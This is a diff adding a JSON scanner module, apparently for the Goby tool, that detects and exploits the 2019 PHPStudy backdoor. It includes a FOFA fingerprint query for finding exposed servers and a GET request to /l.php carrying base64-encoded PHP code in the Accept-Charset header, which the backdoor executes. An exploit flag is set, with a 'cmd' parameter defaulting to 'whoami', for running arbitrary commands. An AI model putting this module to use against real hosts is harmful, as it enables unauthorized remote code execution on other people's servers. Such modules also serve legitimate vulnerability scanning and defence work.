@@ -1,0 +1,64 @@
+{
+  "Name": "PHPStudy Backdoor Remote Code execution",
+  "Description": "This module can detect and exploit the backdoor of PHPStudy.",
+  "Product": "PHPStudy",
+  "Homepage": "",
+  "DisclosureDate": "2019-09-20",
+  "Author": "gobysec@gmail.com",
+  "FofaQuery": "header=\"Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17\" || header=\"Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "https://programmer.group/using-ghidra-to-analyze-the-back-door-of-phpstudy.html",
+	"https://xz.aliyun.com/t/6423"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+            {
+                  "name": "cmd",
+                  "type": "input",
+                  "value": "whoami"
+            }
+      ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+		"header": {"Accept-Encoding":"gzip,deflate", "Accept-Charset":"cHJpbnRmKG1kNSg0NTczMTM0NCkpOw=="},
+        "uri": "/l.php"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "type": "item",
+			"variable": "$body",
+			"operation": "contains",
+            "value": "a5952fb670b54572bcec7440a554633e"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": null,
+  "CVEIDs": null,
+  "CVSSScore": "9.3",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": ["PHPStudy"],
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
